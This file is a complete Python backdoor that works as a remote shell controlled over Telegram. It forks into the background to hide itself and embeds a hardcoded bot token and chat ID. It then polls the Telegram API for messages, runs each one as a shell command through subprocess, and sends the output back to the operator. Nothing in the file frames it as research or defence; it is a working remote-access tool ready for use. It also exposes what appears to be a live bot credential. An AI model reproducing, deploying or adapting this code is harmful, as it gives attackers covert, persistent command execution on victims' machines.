#!/usr/bin/env python3
import requests
import subprocess
import time
import sys
import os

# Hide terminal
if os.name == 'posix':
    if os.fork():
        sys.exit()

BOT_TOKEN = "8330134211:AAEr9LbLhP8B3YnKU8Eso7Hx8iO2Vjt0vdg"
CHAT_ID = "5643920460"


last_update_id = 0
shell_active = False

def send_message(text, keyboard=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": text}
        
        if keyboard:
            data["reply_markup"] = keyboard
            
        requests.post(url, json=data, timeout=10)
    except:
        pass

def get_updates(offset=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        params = {"timeout": 30}
        if offset:
            params["offset"] = offset
        response = requests.get(url, params=params, timeout=35)
        return response.json()
    except:
        return {"result": []}

def execute_command(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=60)
        return result if result else "Command executed successfully"
    except Exception as e:
        return str(e)

def get_shell_keyboard():
    return {
        "keyboard": [
            ["🚀 Activate Shell", "❌ Deactivate Shell"],
            ["📟 System Info", "📁 List Files"],
            ["🖥️ whoami", "📍 pwd"]
        ],
        "resize_keyboard": True
    }

# Startup
send_message("🤖 Remote Shell Bot\nPress '🚀 Activate Shell' to start", get_shell_keyboard())

while True:
    try:
        updates = get_updates(offset=last_update_id + 1)
        
        if "result" in updates:
            for update in updates["result"]:
                last_update_id = update["update_id"]
                
                if "message" in update and "text" in update["message"]:
                    message = update["message"]
                    if str(message["chat"]["id"]) == CHAT_ID:
                        command = message["text"]
                        
                        if command == "🚀 Activate Shell":
                            shell_active = True
                            send_message("✅ Shell ACTIVATED!\nYou can now send commands directly")
                        
                        elif command == "❌ Deactivate Shell":
                            shell_active = False
                            send_message("❌ Shell DEACTIVATED")
                        
                        elif command == "📟 System Info":
                            result = execute_command("uname -a && whoami")
                            send_message(f"System Info:\n{result}")
                        
                        elif command == "📁 List Files":
                            result = execute_command("ls -la")
                            send_message(f"Files:\n{result}")
                        
                        elif command == "🖥️ whoami":
                            result = execute_command("whoami")
                            send_message(f"User: {result}")
                        
                        elif command == "📍 pwd":
                            result = execute_command("pwd")
                            send_message(f"Directory: {result}")
                        
                        elif shell_active:
                            # Shell active থাকলে যেকোনো command execute হবে
                            result = execute_command(command)
                            send_message(result[:4000])
                        
                        else:
                            send_message("⚠️ Shell is not active. Press '🚀 Activate Shell' first")
        
        time.sleep(2)
        
    except Exception:
        time.sleep(10)
